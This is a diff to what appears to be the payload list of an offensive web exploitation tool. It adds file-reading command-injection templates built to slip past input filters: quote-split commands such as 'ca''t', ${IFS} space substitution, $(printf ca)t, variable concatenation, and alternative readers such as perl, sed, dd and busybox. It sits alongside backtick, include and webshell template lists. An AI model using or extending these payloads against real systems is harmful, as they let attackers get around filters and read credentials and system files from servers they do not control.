@@ -16,10 +16,27 @@
     "uniq {path}",
     "base64 {path}",
     "awk '1' {path}",
+    "awk 1 {path}",
     "dd if={path}",
-    "ca\\t {path}",
+    "dd bs=1 if={path}",
     "ca''t {path}",
+    'ca""t {path}',
+    "c''a''t {path}",
+    'c""a""t {path}',
+    "cat${{IFS}}{path}",
+    "tac${{IFS}}{path}",
+    "sort${{IFS}}{path}",
+    "base64${{IFS}}{path}",
+    "$(printf ca)t {path}",
     "a=ca;b=t;$a$b {path}",
+    "echo $(<{path})",
+    "printf %s \"$(<{path})\"",
+    "while read line;do echo $line;done<{path}",
+    "tail -c +1 {path}",
+    "head -c 4096 {path}",
+    "sed '' {path}",
+    "perl -pe 1 {path}",
+    "busybox cat {path}",
     "show_source('{path}')",
     "highlight_file('{path}')",
     "readgzfile('{path}')",
@@ -258,6 +275,12 @@ BACKTICK_TEMPLATES = [
 BACKTICK_COMMAND_TEMPLATES = [
     "cat {path}",
     "tac {path}",
+    "tail -c +1 {path}",
+    "head -c 4096 {path}",
+    "dd bs=1 if={path}",
+    "echo $(<{path})",
+    "printf %s \"$(<{path})\"",
+    "while read line;do echo $line;done<{path}",
 ]
 
 INCLUDE_TEMPLATES = [
@@ -281,7 +304,7 @@ WEBSHELL_TEMPLATES = [
 
 
 
-# AUTO-ONLY ：以下的 payload 只会在 Auto 模式下额外使用
+# AUTO-ONLY
 
 AUTO_ARG_INJECT_BY_CMD = {
     "file": [
